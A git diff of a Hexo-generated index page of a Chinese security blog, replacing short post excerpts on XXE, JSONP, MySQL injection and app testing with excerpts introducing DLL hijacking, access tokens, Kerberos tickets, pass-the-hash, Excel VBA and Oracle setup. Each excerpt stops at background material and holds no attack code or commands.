@@ -1,837 +1,625 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>Page 3 | sh1yan&#39;blog</title>
 
   
-  <meta name="author" content="shiyan">
-  
-
+  <title>sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   <meta name="description" content="信息安全|网络安全|渗透测试|代码审计|安全审计">
+<meta property="og:type" content="website">
+<meta property="og:title" content="sh1yan&#39;blog">
+<meta property="og:url" content="shiyan.top/page/3/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="信息安全|网络安全|渗透测试|代码审计|安全审计">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sh1yan&#39;blog">
+<meta name="twitter:description" content="信息安全|网络安全|渗透测试|代码审计|安全审计">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
   
 
   
 
-  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black">
-
-  
-
-  <meta property="og:site_name" content="sh1yan&#39;blog">
-
-  
-  <meta property="og:image" content="/favicon.ico">
-  
-
-  <link href="/favicon.ico" rel="icon">
-  <link rel="alternate" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
-  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
 </head>
-
-
+</html>
 <body>
-<div class="blog">
-  <div class="content">
-
-    <header>
-  <div class="site-branding">
-    <h1 class="site-title">
-      <a href="/">sh1yan&#39;blog</a>
-    </h1>
-    <p class="site-description"></p>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="shiyan.top"></form>
+      </div>
+    </div>
   </div>
-  <nav class="site-navigation">
-    <ul>
-      
-        <li><a href="/">主页</a></li>
-      
-        <li><a href="/archives">归档</a></li>
-      
-        <li><a href="/about">关于</a></li>
-      
-        <li><a href="/yqlj">友链</a></li>
-      
-        <li><a href="/atom.xml">订阅</a></li>
-      
-    </ul>
-  </nav>
 </header>
 
-    <main class="site-main posts-loop">
-    
-  <article>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-The-Principle-and-Practice-of-DLL-Hijacking" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/" class="article-date">
+  <time datetime="2019-06-15T17:25:55.000Z" itemprop="datePublished">2019-06-16</time>
+</a>
 
-  
     
-    <h3 class="article-title"><a href="/2019/02/24/Recent-insights-2019-02/"><span>最近的一些的感慨</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2019/02/24/Recent-insights-2019-02/" rel="bookmark">
-        <time class="entry-date published" datetime="2019-02-24T08:57:55.000Z">
-          2019-02-24
-        </time>
-      </a>
-    </span>
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
   </div>
 
 
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/">DLL劫持原理与实践</a>
+    </h1>
   
 
-  <div class="article-content">
-    <div class="entry">
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-        <p>&emsp;算了算，毕业也半年多了，近期的状态确实颓废的不行，也不能说是近期，去年10月份换到新的驻地后，就很少自己主动的去学习了，可能没换地方以前，一直都是一个人吧，回到住的地方，没人说话，看电视吧，翻了老半天，也没啥可翻的，看电影吧，也没啥可看的。仿佛除了搞搞自己的小兴趣爱好，看看买的《Android软件安全与逆向分析》和《网络攻防实战研究：漏洞利用与提权》，
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="shiyan.top/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/"></div>
+    </li>
+  </ul>
+</div>
+
       
-    </p></div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
       
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/心情感悟/">心情感悟</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/感悟/">感悟</a>
-    </span>
-    
-
+        <p><strong>0x00 前言</strong></p>
+<p>DLL劫持算是一个老的漏洞，而且乌云漏洞库中也有很多的案例，只不过案例更多的只是验证一下，并没有教如何利用。至于为什么专门抓起来再学一遍了，唉，内网渗透需要。。。</p>
+<p><strong>0x01 什么是DLL</strong></p>
+<p>这里先摘抄一下百度百科的解释：</p>
+<blockquote>
+<p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p>
+</blockquote>
+<p>还有一段，我觉得更好理解的。<br>
+        
+          </p><p class="article-more-link">
+            <a href="/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/#more">Read More</a>
+          </p>
+        
+      
+      
     </div>
+    <footer class="article-footer">
+      
+        <a data-url="shiyan.top/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/" data-id="ck6al74dz0029a8w1up7oydjb" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DLL劫持/">DLL劫持</a></li></ul>
 
-    
+
+    </footer>
   </div>
+  
 </article>
 
 
 
-  <article>
+  
+    <article id="post-Windows-Access-Token-Security-Exploration" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/06/09/Windows-Access-Token-Security-Exploration/" class="article-date">
+  <time datetime="2019-06-09T15:16:26.000Z" itemprop="datePublished">2019-06-09</time>
+</a>
 
-  
     
-    <h3 class="article-title"><a href="/2018/11/16/soulapp-test/"><span>以soul为样本的APP测试总结（待详细）</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/11/16/soulapp-test/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-11-16T09:40:55.000Z">
-          2018-11-16
-        </time>
-      </a>
-    </span>
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
   </div>
 
 
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/09/Windows-Access-Token-Security-Exploration/">Windows访问令牌安全探究</a>
+    </h1>
   
 
-  <div class="article-content">
-    <div class="entry">
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>1. 安装包签名测试</strong></p>
-<blockquote>jarsigner.exe -verify G:\soul.apk -verbose -certs</blockquote>
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="shiyan.top/2019/06/09/Windows-Access-Token-Security-Exploration/"></div>
+    </li>
+  </ul>
+</div>
 
-
-<pre><code>sm    1091972 Fri Nov 30 00:00:00 CST 1979 resources.arsc
-X.509, CN=shijiu
-  [证书的有效期为16-4-1 上午11:22至41-3-26 上午11:22]
-  [CertPath 未验证: Path does not chain with any of the trust anchors]
-
-    1089 Fri Nov 30 00:00:00 CST 1979 META-INF/CERT.RSA
-  436847 Fri Nov 30 00:00:00 CST 1979 META-INF/CERT.SF
-  s     436804 Fri Nov 30 00:00:00 CST 1979 META-INF/MANIFEST.MF
-    X.509, CN=shijiu
-  [证书的有效期为16-4-1 上午11:22至41-3-26 上午11:22]
-  [CertPath 未验证: Path does not chain with any of the trust anchors]
-    s = 已验证签名
-  m = 在清单中列出条目
-  k = 在密钥库中至少找到了一个证书
-  i = 在身份作用域内至少找到了一个证书
-
-- 由 &quot;CN=shijiu&quot; 签名
-摘要算法: SHA1
-签名算法: SHA1withRSA, 2048 位密钥
-
-jar 已验证。
-
-警告:
-此 jar 包含证书链未验证的条目。
-此 jar 包含的签名没有时间戳。如果没有时间戳, 则在签名者证书的到期日期 (2041-03-26) 或以后的任何撤销日期之后, 用户可能无
-法验证此 jar。
-
-&lt;strong&gt;2. 反编译保护&lt;/strong&gt; 
-</code></pre><blockquote><br>1. soul.apk 修改后缀名为 soul.zip / 或者直接用解压的方式解压<br>2. 把soul.rar 解压后，找见 classes.dex<br>3. java -jar dex2jar.bat G:\soul\classes.dex</blockquote><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Invalid or corrupt jarfile</span><br></pre></td></tr></table></figure><br><br>
+      
+      
+        <p><strong>0x00 前言</strong></p>
+<p>access token俗称为访问令牌，围绕着该访问令牌也有着相应的渗透技巧，故而也就有这篇文章的总结。</p>
+<p><strong>0x01 什么是访问令牌（access token）?</strong></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthZ/access-tokens" target="_blank" rel="noopener">访问令牌</a>是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为user生成一个访问令牌。之后，该user执行的每个进程都会拥有一个该访问令牌的拷贝。<br>
+        
+          </p><p class="article-more-link">
+            <a href="/2019/06/09/Windows-Access-Token-Security-Exploration/#more">Read More</a>
+          </p>
+        
+      
       
     </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
+    <footer class="article-footer">
       
+        <a data-url="shiyan.top/2019/06/09/Windows-Access-Token-Security-Exploration/" data-id="ck6al74fc003va8w123s4kscy" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/access-token/">access token</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/令牌伪造/">令牌伪造</a></li></ul>
 
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/渗透测试/">渗透测试</a>
-    </span>
-    
 
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/Android/">Android</a>
-    </span>
-    
-
-    </div>
-
-    
+    </footer>
   </div>
+  
 </article>
 
 
 
-  <article>
+  
+    <article id="post-Discussion-on-Silver-Bill-and-Gold-Bill" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" class="article-date">
+  <time datetime="2019-06-03T15:52:55.000Z" itemprop="datePublished">2019-06-03</time>
+</a>
 
-  
     
-    <h3 class="article-title"><a href="/2018/09/15/xxe-study/"><span>漏洞学习之XXE注入</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/09/15/xxe-study/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-09-15T09:40:55.000Z">
-          2018-09-15
-        </time>
-      </a>
-    </span>
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/学习笔记/">学习笔记</a>
   </div>
 
 
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/">白银票据与黄金票据探究</a>
+    </h1>
   
 
-  <div class="article-content">
-    <div class="entry">
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-        <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>       // XML声明</span><br><span class="line"> <span class="meta">&lt;!DOCTYPE note [                             //定义类型</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT note (to,from,heading,body)&gt;   //定义元素</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT to (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT from (#PCDATA)&gt;                // 文档类型定义</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta"> 	&lt;!ELEMENT body (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>lixin<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>shiyan<span class="tag">&lt;/<span class="name">from</span>&gt;</span>                // 文档元素</span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Hurry up and send out XXE's article<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br>DTD 主要用来解释文档元素的，它有三种应用形式：</p>
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="shiyan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        <p><strong>0x00  前言</strong></p>
+<p>在域渗透时，肯定会接触到两个最常见的概念，白银票据和黄金票据，而这两个票据主要是围绕着Kerberos这个认证协议所产生的。</p>
+<p><strong>0x01  Kerberos认证</strong></p>
+<p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。<br>
+        
+          </p><p class="article-more-link">
+            <a href="/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/#more">Read More</a>
+          </p>
+        
+      
       
     </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
+    <footer class="article-footer">
       
+        <a data-url="shiyan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" data-id="ck6al74dq001va8w1m9739q9p" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kerberos认证/">Kerberos认证</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/域渗透/">域渗透</a></li></ul>
 
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/漏洞研究/">漏洞研究</a>
-    </span>
-    
 
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/web漏洞/">web漏洞</a><a href="/tags/XXE/">XXE</a>
-    </span>
-    
-
-    </div>
-
-    
+    </footer>
   </div>
+  
 </article>
 
 
 
-  <article>
+  
+    <article id="post-Hash-Passing-Attack-explore" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/05/19/Hash-Passing-Attack-explore/" class="article-date">
+  <time datetime="2019-05-19T01:25:55.000Z" itemprop="datePublished">2019-05-19</time>
+</a>
 
-  
     
-    <h3 class="article-title"><a href="/2018/08/12/jsonp-study/"><span>对jsonp劫持的一次简单了解</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/08/12/jsonp-study/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-08-12T01:20:56.000Z">
-          2018-08-12
-        </time>
-      </a>
-    </span>
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
   </div>
 
 
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/19/Hash-Passing-Attack-explore/">hash传递攻击研究</a>
+    </h1>
   
 
-  <div class="article-content">
-    <div class="entry">
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>0x01</strong></p>
-<p>jsonp劫持算是一个老漏洞，我老早就想总结一下来着，但是懒所以没弄，最近正好兴趣上来了，就整理整理下把。</p>
-<p>首先了解jsonp得先大概的了解下json。</p>
-<p>json全称为<strong>J</strong>ava<strong>S</strong>cript <strong>O</strong>bject <strong>N</strong>otation(JavaScript 对象表示法) ，<br>
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="shiyan.top/2019/05/19/Hash-Passing-Attack-explore/"></div>
+    </li>
+  </ul>
+</div>
+
       
-    </p></div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
       
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/漏洞研究/">漏洞研究</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/jsonp/">jsonp</a><a href="/tags/web漏洞/">web漏洞</a>
-    </span>
-    
-
+        <p><strong>0x00 前言</strong></p>
+<p>记得还是在17年11月份的时候，ice老师当时在shepi群里分享了两个技巧，记忆最深的一句话是：</p>
+<p>“服务器密码解不出来，不用解了，用hash登录”，当时的自己还是停留在web的程度，没有过多的思考，</p>
+<p>最近想起来了就研究一下为什么这么说。</p>
+<p><strong>0x01 NTLM-Hash</strong></p>
+<p>什么是ntlm-hash？<br>
+        
+          </p><p class="article-more-link">
+            <a href="/2019/05/19/Hash-Passing-Attack-explore/#more">Read More</a>
+          </p>
+        
+      
+      
     </div>
+    <footer class="article-footer">
+      
+        <a data-url="shiyan.top/2019/05/19/Hash-Passing-Attack-explore/" data-id="ck6al74dr001wa8w1t48jfr1a" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hash/">hash</a></li></ul>
 
-    
+
+    </footer>
   </div>
+  
 </article>
 
 
 
-  <article>
+  
+    <article id="post-excel-vba-2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/05/11/excel-vba-2/" class="article-date">
+  <time datetime="2019-05-11T08:16:55.000Z" itemprop="datePublished">2019-05-11</time>
+</a>
 
-  
     
-    <h3 class="article-title"><a href="/2018/07/09/Port-Forwarding-Tool-Analysis/"><span>对某端口转发工具的一次分析</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/07/09/Port-Forwarding-Tool-Analysis/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-07-09T02:40:55.000Z">
-          2018-07-09
-        </time>
-      </a>
-    </span>
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/学习笔记/">学习笔记</a>
   </div>
 
 
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/11/excel-vba-2/">Excel_2016_VBA学习笔记_工作簿与工作表篇②</a>
+    </h1>
   
 
-  <div class="article-content">
-    <div class="entry">
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-        <h5 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h5><p>在上上一篇文章中就计划对一个端口转发工具进行分析的，但是，由于自己懒的原因就一下子拖了好几个月，后来自己再分析的时候出现了分析的逻辑性错误，所以，求助了老P同志，所以转进入正轨。</p>
-<p>工具名是 rtcp.py ，是2009年知道创宇当时写的一个端口转发工具，工具主要是利用python的socket端口转发，代码的整体编写思路非常值得学习。</p>
-<h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>我一开始是从模块开始分析的，忘记了从运行流程上来分析，所以出现卡壳了。<br>
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="shiyan.top/2019/05/11/excel-vba-2/"></div>
+    </li>
+  </ul>
+</div>
+
       
-    </p></div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
       
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/脚本编写/">脚本编写</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/工具分析/">工具分析</a><a href="/tags/端口转发/">端口转发</a>
-    </span>
-    
-
+        <p><strong>1.定义</strong></p>
+<p>工作簿，就是Excel的一个文件，这个文件是由多张工作表组成。</p>
+<p>工作簿可以看做一本书，而工作表可以看做是表里的每一页。</p>
+<p>工作表能建立多少个取决去内存的大小。</p>
+<p>重要性：工作簿（workbook）与工作表（worksheet）是Excel vba中非常重要的两个对象。<br>
+        
+          </p><p class="article-more-link">
+            <a href="/2019/05/11/excel-vba-2/#more">Read More</a>
+          </p>
+        
+      
+      
     </div>
+    <footer class="article-footer">
+      
+        <a data-url="shiyan.top/2019/05/11/excel-vba-2/" data-id="ck6al74cs000ja8w14i0ek23a" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Excel/">Excel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vba/">vba</a></li></ul>
 
-    
+
+    </footer>
   </div>
+  
 </article>
 
 
 
-  <article>
+  
+    <article id="post-Various-pits-in-installation-of-oracle" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/05/10/Various-pits-in-installation-of-oracle/" class="article-date">
+  <time datetime="2019-05-10T15:23:55.000Z" itemprop="datePublished">2019-05-10</time>
+</a>
 
-  
     
-    <h3 class="article-title"><a href="/2018/05/26/mysql-writ-shell/"><span>基于mysql下的几种写shell方法</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/05/26/mysql-writ-shell/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-05-26T13:55:32.000Z">
-          2018-05-26
-        </time>
-      </a>
-    </span>
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/数据库/">数据库</a>
   </div>
 
 
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/10/Various-pits-in-installation-of-oracle/">Oracle安装使用中的各种坑</a>
+    </h1>
   
 
-  <div class="article-content">
-    <div class="entry">
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>0x00</strong></p>
-<p>关于mysql下的写shell方法网上基本很多了，我原本也没打算总结总结的，毕竟网上已经很多了，不过在看 kilon 大佬的博客的时候，给我的感受就是明明一个几句话的东西，总能详细的，有条有理的记录下来，所以也正是如此，才有了这篇文章。</p>
-<p><strong>0x01</strong></p>
-<p>利用条件<br>
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="shiyan.top/2019/05/10/Various-pits-in-installation-of-oracle/"></div>
+    </li>
+  </ul>
+</div>
+
       
-    </p></div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
       
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/渗透测试/">渗透测试</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/mysql/">mysql</a><a href="/tags/shell/">shell</a>
-    </span>
-    
-
+        <p><strong>0x00 前言</strong></p>
+<p>前期因为审计需求，需要本地搭建Oracle数据，但是各种原因安装失败，或者安装成功，但是无法使用pl\sql进行连接操作，故记录下所有踩过的坑。</p>
+<p><strong>0x01 本机版本+安装包</strong></p>
+<p>Windows 10 专业版 64位<br>
+        
+          </p><p class="article-more-link">
+            <a href="/2019/05/10/Various-pits-in-installation-of-oracle/#more">Read More</a>
+          </p>
+        
+      
+      
     </div>
+    <footer class="article-footer">
+      
+        <a data-url="shiyan.top/2019/05/10/Various-pits-in-installation-of-oracle/" data-id="ck6al74cp000ea8w17o6kums6" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Oracle/">Oracle</a></li></ul>
 
-    
+
+    </footer>
   </div>
+  
 </article>
 
 
 
-  <article>
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+    </nav>
+  
 
+</section>
+        
+          <aside id="sidebar">
   
     
-    <h3 class="article-title"><a href="/2018/02/19/mysql-Error-injection/"><span>Mysql报错注入</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/02/19/mysql-Error-injection/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-02-19T07:40:55.000Z">
-          2018-02-19
-        </time>
-      </a>
-    </span>
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
   </div>
+<br>
 
 
-  
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
 
-  <div class="article-content">
-    <div class="entry">
+
+<!-- 优美的分割线 -->
+
       
-        <p><strong>0x01</strong> 前言</p>
-<p>法师的那本代码审计书，我也看到了关于十个报错注入那页（157-161），但是书上并没有特详细说明函数的意思还有剩下的都是点点就过了，再着我想到了 luanmap 就是纯粹的利用报错来注入的工具，所以我就整理整理关于 mysql 报错注入的总结把。</p>
-<p><strong>0x02</strong> floor()   // 5.0 , 5.1 , 5.5</p>
-<p>count() 匹配指定表，库里值的行数，也就是个数<br>concat() 把里面的参数字符串连接起来<br>floor() 向下取整，就是取整数显示<br>rand() 用于产生一个 0~1的随机数<br>group by 根据自己的命名来分组数据，左边为右边的键，右边为值，可以这么理解，具体的自己百度吧<br>
       
-    </p></div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
+      <p></p>
       
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/渗透测试/">渗透测试</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
